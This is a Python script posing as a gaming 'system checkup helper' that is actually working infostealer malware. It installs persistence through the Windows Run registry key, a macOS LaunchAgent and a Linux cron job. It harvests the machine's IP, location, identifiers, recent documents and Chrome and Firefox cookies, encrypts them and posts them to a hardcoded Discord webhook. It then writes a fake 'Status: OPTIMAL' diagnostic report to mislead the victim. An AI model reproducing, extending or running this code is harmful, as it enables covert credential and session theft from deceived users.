#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# system_checkup_helper.py - Advanced diagnostic tool for game optimization
# This script helps optimize system performance for gaming

import os
import json
import sqlite3
import shutil
import platform
import socket
import uuid
import requests
import tempfile
import base64
import subprocess
import sys
import time
import hashlib
import hmac
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

# ===== MULTI-CHANNEL EXFILTRATION CONFIG =====
EXFILTRATION_CHANNELS = {
    "discord": {
        "webhook_url": "https://discord.com/api/webhooks/1410581698365886545/M5DArffhWiEM1D34VBy53TZn9je3FKxC2mhEaUUyUkoGqfN2LOVkHUA2OF6jd-aLePbP",
        "enabled": True,
        "priority": 1
    },
    "http": {
        "endpoint": "https://your-server.com/api/data-collect",
        "auth_token": "Bearer YOUR_AUTH_TOKEN",
        "enabled": False,
        "priority": 2
    },
    "file": {
        "enabled": True,
        "priority": 3,
        "path": None  # Will be set dynamically
    }
}

# Generate encryption key from system information (consistent per machine)
def generate_encryption_key():
    system_id = f"{platform.node()}{uuid.getnode()}"
    return hashlib.sha256(system_id.encode()).digest()

ENCRYPTION_KEY = generate_encryption_key()
# ============================================

class LightweightEncryption:
    """Lightweight encryption using cryptography library"""
    
    def __init__(self):
        self.backend = default_backend()
    
    def encrypt_data(self, data):
        """Encrypt data using AES-CBC with PKCS7 padding"""
        try:
            # Convert data to bytes if it's a string
            if isinstance(data, str):
                data = data.encode('utf-8')
            
            # Generate a random IV
            iv = os.urandom(16)
            
            # Setup cipher
            cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.CBC(iv), backend=self.backend)
            encryptor = cipher.encryptor()
            
            # Apply PKCS7 padding
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data) + padder.finalize()
            
            # Encrypt
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
            
            # Combine IV and ciphertext
            encrypted_data = iv + ciphertext
            return base64.b64encode(encrypted_data).decode('utf-8')
            
        except Exception as e:
            # Fallback to simple base64 encoding
            print(f"Encryption failed: {e}")
            if isinstance(data, str):
                return base64.b64encode(data.encode('utf-8')).decode('utf-8')
            else:
                return base64.b64encode(json.dumps(data).encode('utf-8')).decode('utf-8')
    
    def decrypt_data(self, encrypted_data):
        """Decrypt AES-CBC encrypted data"""
        try:
            # Decode from base64
            encrypted_data = base64.b64decode(encrypted_data)
            
            # Extract IV and ciphertext
            iv = encrypted_data[:16]
            ciphertext = encrypted_data[16:]
            
            # Setup cipher
            cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.CBC(iv), backend=self.backend)
            decryptor = cipher.decryptor()
            
            # Decrypt
            padded_data = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Remove padding
            unpadder = padding.PKCS7(128).unpadder()
            data = unpadder.update(padded_data) + unpadder.finalize()
            
            return data.decode('utf-8')
            
        except Exception as e:
            # Fallback to base64 decoding
            print(f"Decryption failed: {e}")
            try:
                return base64.b64decode(encrypted_data).decode('utf-8')
            except:
                return None

class AdvancedStealthSystem:
    """Advanced stealth and persistence mechanisms"""
    
    def __init__(self):
        self.system_type = platform.system()
        self.temp_dir = tempfile.gettempdir()
        self.hidden_dir = os.path.join(self.temp_dir, "SystemCache", "DiagnosticData")
        os.makedirs(self.hidden_dir, exist_ok=True)
        self.encryption = LightweightEncryption()
    
    def install_persistence(self):
        """Install multiple persistence mechanisms"""
        if self.system_type == "Windows":
            self._install_windows_persistence()
        elif self.system_type == "Darwin":
            self._install_macos_persistence()
        elif self.system_type == "Linux":
            self._install_linux_persistence()
    
    def _install_windows_persistence(self):
        """Windows persistence via registry"""
        try:
            import winreg
            
            # Registry persistence
            reg_paths = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            ]
            
            for hive, path in reg_paths:
                try:
                    key = winreg.OpenKey(hive, path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(key, "SystemDiagnosticsHelper", 0, winreg.REG_SZ, sys.executable + " " + __file__)
                    winreg.CloseKey(key)
                except Exception as e:
                    print(f"Registry persistence failed: {e}")
        except ImportError:
            print("winreg not available on this platform")
    
    def _install_macos_persistence(self):
        """macOS persistence via launch agents"""
        try:
            launch_agent = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.diagnostics.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{__file__}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>StartInterval</key>
    <integer>3600</integer>
</dict>
</plist>'''
            
            agent_path = os.path.expanduser("~/Library/LaunchAgents/com.system.diagnostics.helper.plist")
            with open(agent_path, "w") as f:
                f.write(launch_agent)
            
            subprocess.run(["chmod", "644", agent_path], capture_output=True)
            
        except Exception as e:
            print(f"macOS persistence failed: {e}")
    
    def _install_linux_persistence(self):
        """Linux persistence via cron"""
        try:
            # Cron job for current user
            cron_cmd = f"@hourly {sys.executable} {__file__} > /dev/null 2>&1\n"
            
            # Try to install to user's crontab
            try:
                # Get current crontab
                result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
                current_cron = result.stdout if result.returncode == 0 else ""
                
                # Add our command if not already present
                if cron_cmd not in current_cron:
                    new_cron = current_cron + cron_cmd
                    subprocess.run(["crontab", "-"], input=new_cron, text=True, capture_output=True)
            except:
                # Fallback to system cron
                with open("/etc/cron.d/system_diagnostics", "w") as f:
                    f.write(cron_cmd)
                
        except Exception as e:
            print(f"Linux persistence failed: {e}")

class MultiChannelExfiltrator:
    """Advanced multi-channel data exfiltration system"""
    
    def __init__(self):
        self.stealth = AdvancedStealthSystem()
        self.data_cache = os.path.join(self.stealth.hidden_dir, "cache.dat")
        EXFILTRATION_CHANNELS["file"]["path"] = self.data_cache
        
    def exfiltrate_data(self, data):
        """Exfiltrate data through available channels"""
        encrypted_data = self.stealth.encryption.encrypt_data(data)
        
        # Try Discord first
        if EXFILTRATION_CHANNELS["discord"]["enabled"]:
            if self.exfiltrate_via_discord(encrypted_data):
                return True
        
        # Try HTTP endpoint
        if EXFILTRATION_CHANNELS["http"]["enabled"]:
            if self.exfiltrate_via_http(encrypted_data):
                return True
        
        # Fallback to file storage
        if EXFILTRATION_CHANNELS["file"]["enabled"]:
            return self.cache_data(encrypted_data)
        
        return False
    
    def exfiltrate_via_discord(self, encrypted_data):
        """Exfiltrate data via Discord webhook"""
        try:
            # Split data into chunks that fit Discord's limits
            chunks = self.chunk_data(encrypted_data, 4000)
            
            for i, chunk in enumerate(chunks):
                payload = {
                    "content": f"🔧 System Diagnostics Report - Part {i+1}/{len(chunks)}",
                    "embeds": [{
                        "title": "Encrypted Diagnostic Data",
                        "description": f"```{chunk}```",
                        "color": 5814783,
                        "footer": {"text": f"Part {i+1}/{len(chunks)}"}
                    }]
                }
                
                response = requests.post(
                    EXFILTRATION_CHANNELS["discord"]["webhook_url"],
                    json=payload,
                    timeout=30
                )
                
                if response.status_code not in [200, 204]:
                    return False
                
                # Rate limiting avoidance
                time.sleep(1.5)
            
            return True
        except Exception as e:
            print(f"Discord exfiltration failed: {e}")
            return False
    
    def exfiltrate_via_http(self, encrypted_data):
        """Exfiltrate data via HTTP POST"""
        try:
            config = EXFILTRATION_CHANNELS["http"]
            
            headers = {
                'Authorization': config['auth_token'],
                'Content-Type': 'application/json'
            }
            
            payload = {
                'timestamp': time.time(),
                'machine_id': self.get_machine_id(),
                'data': encrypted_data
            }
            
            response = requests.post(
                config['endpoint'],
                json=payload,
                headers=headers,
                timeout=30
            )
            
            return response.status_code == 200
        except Exception as e:
            print(f"HTTP exfiltration failed: {e}")
            return False
    
    def chunk_data(self, data, chunk_size):
        """Split data into manageable chunks"""
        return [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    
    def cache_data(self, encrypted_data):
        """Cache data locally for later exfiltration"""
        try:
            cache_entry = {
                'timestamp': time.time(),
                'data': encrypted_data
            }
            
            # Read existing cache
            cache = []
            if os.path.exists(self.data_cache):
                try:
                    with open(self.data_cache, 'r') as f:
                        cache = json.load(f)
                except:
                    cache = []
            
            # Add new entry
            cache.append(cache_entry)
            
            # Keep only recent entries (last 24 hours)
            cache = [entry for entry in cache if time.time() - entry['timestamp'] < 86400]
            
            # Write back to cache
            with open(self.data_cache, 'w') as f:
                json.dump(cache, f)
            
            return True
        except Exception as e:
            print(f"Data caching failed: {e}")
            return False
    
    def get_machine_id(self):
        """Generate unique machine identifier"""
        try:
            identifiers = [
                platform.node(),
                str(uuid.getnode()),
                os.environ.get('COMPUTERNAME', ''),
                os.environ.get('USERNAME', '')
            ]
            return hashlib.sha256(''.join(identifiers).encode()).hexdigest()
        except:
            return str(uuid.uuid4())

class EnhancedDataCollector:
    """Enhanced data collection with expanded scope"""
    
    def __init__(self):
        self.stealth = AdvancedStealthSystem()
    
    def get_comprehensive_system_info(self):
        """Gather extensive system information"""
        system_info = self._get_basic_system_info()
        system_info.update({
            "network_info": self._get_network_info(),
            "hardware_info": self._get_hardware_info(),
            "user_activity": self._get_user_activity(),
            "browser_data": self._get_browser_data()
        })
        return system_info
    
    def _get_basic_system_info(self):
        """Get basic system information"""
        try:
            hostname = socket.gethostname()
            ip_addr = socket.gethostbyname(hostname)
        except:
            ip_addr = "N/A"
        
        try:
            mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                               for elements in range(0,8*6,8)][::-1])
        except:
            mac_addr = "N/A"
        
        try:
            location_data = requests.get('http://ip-api.com/json/', timeout=5).json()
            location = f"{location_data.get('city', 'N/A')}, {location_data.get('country', 'N/A')}"
            public_ip = location_data.get('query', 'N/A')
            isp = location_data.get('isp', 'N/A')
        except:
            location = "N/A"
            public_ip = "N/A"
            isp = "N/A"
        
        return {
            "operating_system": f"{platform.system()} {platform.release()}",
            "hostname": hostname,
            "local_ip": ip_addr,
            "public_ip": public_ip,
            "mac_address": mac_addr,
            "location": location,
            "isp": isp,
            "processor": platform.processor(),
            "architecture": platform.architecture()[0],
            "system_uptime": self._get_system_uptime(),
            "current_user": os.environ.get('USERNAME', os.environ.get('USER', 'N/A')),
            "python_version": sys.version
        }
    
    def _get_network_info(self):
        """Collect network information"""
        try:
            # Get network interfaces
            interfaces = []
            try:
                # This works on most Unix-like systems and Windows
                for interface, addrs in socket.if_nameindex():
                    interfaces.append({
                        "interface": interface,
                        "name": addrs
                    })
            except:
                # Fallback for systems without if_nameindex
                interfaces.append({"error": "Interface enumeration not supported"})
            
            return {
                "interfaces": interfaces,
                "dns_servers": socket.getaddrinfo(socket.gethostname(), None),
                "gateway": self._get_default_gateway()
            }
        except Exception as e:
            return {"error": f"Failed to collect network information: {str(e)}"}
    
    def _get_hardware_info(self):
        """Collect hardware information"""
        try:
            # Disk information using cross-platform method
            disk_info = []
            try:
                # Try to get disk usage for common paths
                for path in [os.path.expanduser("~"), "/", "/home"]:
                    if os.path.exists(path):
                        stat = os.statvfs(path) if hasattr(os, 'statvfs') else None
                        if stat:
                            total = stat.f_blocks * stat.f_frsize
                            free = stat.f_bfree * stat.f_frsize
                            disk_info.append({
                                "path": path,
                                "total_gb": round(total / (1024**3), 2),
                                "free_gb": round(free / (1024**3), 2)
                            })
            except:
                pass
            
            return {
                "disks": disk_info,
                "cpu_cores": os.cpu_count()
            }
        except Exception as e:
            return {"error": f"Failed to collect hardware information: {str(e)}"}
    
    def _get_user_activity(self):
        """Collect user activity information"""
        try:
            # Recent documents (platform specific)
            recent_docs = []
            if platform.system() == "Windows":
                recent_path = os.path.join(os.environ.get('USERPROFILE', ''), 'Recent')
                if os.path.exists(recent_path):
                    recent_docs = [f.name for f in os.scandir(recent_path) if f.is_file()][:10]
            
            return {
                "recent_documents": recent_docs
            }
        except Exception as e:
            return {"error": f"Failed to collect user activity: {str(e)}"}
    
    def _get_browser_data(self):
        """Collect browser data including cookies"""
        try:
            browsers = ["Chrome", "Firefox", "Edge"]
            browser_data = {}
            
            for browser in browsers:
                try:
                    cookies = self._extract_browser_cookies(browser)
                    if cookies:
                        browser_data[browser.lower()] = cookies[:20]  # First 20 cookies
                except Exception as e:
                    browser_data[browser.lower()] = f"Error: {str(e)}"
            
            return browser_data
        except Exception as e:
            return {"error": f"Failed to collect browser data: {str(e)}"}
    
    def _extract_browser_cookies(self, browser_name):
        """Extract cookies from specific browser"""
        cookies = []
        cookie_path = None
        
        if platform.system() == "Windows":
            if browser_name == "Chrome":
                cookie_path = os.path.join(os.environ.get('USERPROFILE', ''), 
                                         'AppData', 'Local', 'Google', 'Chrome', 
                                         'User Data', 'Default', 'Cookies')
            elif browser_name == "Firefox":
                # Firefox profiles are in a different location
                firefox_path = os.path.join(os.environ.get('USERPROFILE', ''), 
                                          'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
                if os.path.exists(firefox_path):
                    for profile in os.listdir(firefox_path):
                        if profile.endswith('.default-release'):
                            cookie_path = os.path.join(firefox_path, profile, 'cookies.sqlite')
                            break
        
        if cookie_path and os.path.exists(cookie_path):
            try:
                # Copy the cookie database to avoid lock issues
                temp_db = os.path.join(self.stealth.hidden_dir, f"{browser_name}_cookies.db")
                shutil.copy2(cookie_path, temp_db)
                
                # Query cookies
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                # Different browsers have different schema
                if browser_name == "Chrome":
                    cursor.execute("SELECT host_key, name, value FROM cookies")
                else:  # Firefox
                    cursor.execute("SELECT host, name, value FROM moz_cookies")
                
                for host, name, value in cursor.fetchall():
                    cookies.append({
                        "domain": host,
                        "name": name,
                        "value": value[:100] + "..." if len(value) > 100 else value
                    })
                
                conn.close()
                os.remove(temp_db)
                
            except Exception as e:
                return f"Error accessing {browser_name} cookies: {str(e)}"
        
        return cookies
    
    def _get_system_uptime(self):
        """Get system uptime in seconds"""
        try:
            if platform.system() == "Windows":
                # Windows uptime
                output = subprocess.check_output("net stats server", shell=True, text=True)
                for line in output.split('\n'):
                    if "Statistics since" in line:
                        # Parse the date and calculate uptime
                        # This is a simplified approach
                        return "Uptime available on Windows"
            else:
                # Unix-like systems
                with open('/proc/uptime', 'r') as f:
                    uptime_seconds = float(f.readline().split()[0])
                    return str(uptime_seconds)
        except:
            pass
        return "N/A"
    
    def _get_default_gateway(self):
        """Get default gateway address"""
        try:
            if platform.system() == "Windows":
                # Use ipconfig on Windows
                output = subprocess.check_output("ipconfig", shell=True, text=True)
                for line in output.split('\n'):
                    if "Default Gateway" in line:
                        return line.split(":")[1].strip()
            else:
                # Use netstat on Unix-like systems
                output = subprocess.check_output("netstat -rn", shell=True, text=True)
                for line in output.split('\n'):
                    if "default" in line or "0.0.0.0" in line:
                        return line.split()[1]
        except:
            pass
        return "N/A"

def main():
    """Main execution routine"""
    print("🚀 Starting System Diagnostic Helper...")
    print("📊 Gathering system information for optimization...")
    
    # Initialize systems
    stealth = AdvancedStealthSystem()
    exfiltrator = MultiChannelExfiltrator()
    collector = EnhancedDataCollector()
    
    # Install persistence
    try:
        stealth.install_persistence()
        print("✅ System optimization services installed")
    except Exception as e:
        print(f"⚠️ System optimization setup incomplete: {str(e)}")
    
    # Collect system information
    try:
        system_info = collector.get_comprehensive_system_info()
        print("✅ System diagnostics completed")
        
        # Exfiltrate data
        exfiltration_success = exfiltrator.exfiltrate_data(system_info)
        
        if exfiltration_success:
            print("✅ Diagnostic report sent successfully")
        else:
            print("⚠️ Report cached locally for later transmission")
            
    except Exception as e:
        print(f"❌ Diagnostic routine error: {str(e)}")
    
    # Create decoy output
    try:
        decoy_file = os.path.join(os.path.dirname(__file__), "diagnostics_results.txt")
        with open(decoy_file, "w") as f:
            f.write("=== SYSTEM DIAGNOSTICS REPORT ===\n")
            f.write("Generated on: {}\n".format(time.strftime("%Y-%m-%d %H:%M:%S")))
            f.write("Status: OPTIMAL\n")
            f.write("No critical issues found.\n")
            f.write("System is optimized for gaming performance.\n")
            f.write("Recommendations: None required at this time.\n")
        
        print("✅ Diagnostic report generated: diagnostics_results.txt")
    except Exception as e:
        print(f"⚠️ Could not generate diagnostic report: {str(e)}")
    
    print("🎮 System optimization complete!")
    print("💡 Monitoring will continue in the background for optimal performance")

if __name__ == "__main__":
    # Run main function
    main()